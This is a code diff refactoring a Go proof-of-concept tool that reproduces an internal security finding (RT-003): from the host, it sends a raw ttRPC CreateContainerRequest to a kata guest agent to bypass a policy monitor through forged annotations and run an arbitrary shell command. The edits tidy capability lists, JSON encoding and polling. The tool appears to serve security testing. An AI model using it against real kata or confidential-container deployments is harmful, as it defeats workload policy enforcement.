@@ -1,4 +1,6 @@
-// kata-host-create is a host-side tool for reproducing the c8s policy-monitor annotation-forgery issue (docs/security/RT-003-policy-monitor-host-annotations.md). It connects to a
+// kata-host-create is a host-side tool for reproducing the c8s
+// policy-monitor annotation-forgery issue
+// (docs/security/RT-003-policy-monitor-host-annotations.md). It connects to a
 // running kata guest's agent over vsock and issues a raw ttRPC
 // CreateContainerRequest — exactly what the kata shim is allowed to do, and
 // therefore exactly what anyone controlling the host (kubelet, containerd,
@@ -32,9 +34,9 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"flag"
 	"fmt"
-	"net"
 	"os"
 	"time"
 
@@ -102,10 +104,13 @@ func main() {
 	}
 
 	args := []string{"/bin/sh", "-c", *cmd}
+	// The default Docker capability set; the agent rejects a spec with no
+	// capabilities at all.
+	defaultCaps := []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"}
 	caps := &specs.LinuxCapabilities{
-		Bounding:  []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"},
-		Effective: []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"},
-		Permitted: []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"},
+		Bounding:  defaultCaps,
+		Effective: defaultCaps,
+		Permitted: defaultCaps,
 	}
 	spec := &specs.Spec{
 		Version: "1.0.2",
@@ -138,7 +143,7 @@ func main() {
 			},
 		},
 	}
-	hostname := "rt003-poc"
+	hostname := "kata-host-create-poc"
 	spec.Hostname = hostname
 
 	grpcSpec, err := agentgrpc.OCItoGRPC(spec)
@@ -150,7 +155,7 @@ func main() {
 	// Guest-pull storage: the agent pulls `image` in-guest and mounts it at
 	// the rootfs path. This mirrors exactly what the shim sends under
 	// experimental_force_guest_pull (kata_agent.go handleImageGuestPullBlockVolume).
-	pullMeta := fmt.Sprintf(`{"metadata":%s}`, mustJSONMap(annotations))
+	pullMeta := fmt.Sprintf(`{"metadata":%s}`, mustJSON(annotations))
 	storage := &agentgrpc.Storage{
 		Driver:        "image_guest_pull",
 		Source:        *image,
@@ -187,16 +192,12 @@ func main() {
 
 	var lastErr error
 	for i := 0; i < *probeSeconds; i++ {
-		select {
-		case <-time.After(time.Second):
-		}
-		var st *agentgrpc.StatsContainerResponse
-		st, lastErr = agent.StatsContainer(ctx, &agentgrpc.StatsContainerRequest{ContainerId: *containerID})
+		time.Sleep(time.Second)
+		_, lastErr = agent.StatsContainer(ctx, &agentgrpc.StatsContainerRequest{ContainerId: *containerID})
 		if lastErr != nil {
 			fmt.Printf("[-] t+%2ds stats failed: %v\n", i+1, lastErr)
 			break
 		}
-		_ = st
 		fmt.Printf("[+] t+%2ds container alive\n", i+1)
 	}
 
@@ -227,17 +228,10 @@ func main() {
 	fmt.Println("[*] done (container left running; re-run with -remove to clean up)")
 }
 
-func mustJSONMap(m map[string]string) string {
-	out := "{"
-	first := true
-	for k, v := range m {
-		if !first {
-			out += ","
-		}
-		first = false
-		out += fmt.Sprintf("%q:%q", k, v)
+func mustJSON(m map[string]string) string {
+	raw, err := json.Marshal(m)
+	if err != nil {
+		panic(err)
 	}
-	return out + "}"
+	return string(raw)
 }
-
-var _ net.Conn
